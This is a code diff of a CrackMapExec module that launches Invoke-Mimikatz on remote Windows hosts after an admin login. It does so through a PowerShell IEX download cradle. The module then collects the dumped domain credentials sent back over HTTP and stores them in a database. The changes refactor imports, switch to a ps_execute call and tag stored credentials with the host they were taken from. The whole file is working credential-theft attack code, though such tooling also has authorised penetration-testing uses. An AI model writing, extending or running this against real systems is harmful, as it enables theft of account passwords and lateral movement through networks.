@@ -1,9 +1,9 @@
-from cme.helpers.powershell import obfs_ps_script
+from cme.helpers.powershell import obfs_ps_script, gen_ps_iex_cradle
 from cme.helpers.misc import validate_ntlm
-from cme.helpers.logger import write_log
-from StringIO import StringIO
+from cme.helpers.logger import write_log, highlight
 from datetime import datetime
 import re
+
 
 class CMEModule:
     '''
@@ -30,9 +30,8 @@ class CMEModule:
     def on_admin_login(self, context, connection):
         command = "Invoke-Mimikatz -Command '{}'".format(self.command)
         launcher = gen_ps_iex_cradle(context, 'Invoke-Mimikatz.ps1', command)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
@@ -185,7 +184,7 @@ class CMEModule:
         length = int(response.headers.getheader('content-length'))
         data = response.rfile.read(length)
 
-        #We've received the response, stop tracking this host
+        # We've received the response, stop tracking this host
         response.stop_tracking_host()
 
         if len(data):
@@ -194,9 +193,9 @@ class CMEModule:
                 if len(creds):
                     for cred_set in creds:
                         credtype, domain, username, password,_,_ = cred_set
-                        #Get the hostid from the DB
+                        # Get the hostid from the DB
                         hostid = context.db.get_computers(response.client_address[0])[0][0]
-                        context.db.add_credential(credtype, domain, username, password, hostid)
+                        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
                         context.log.highlight('{}\\{}:{}'.format(domain, username, password))
 
                     context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
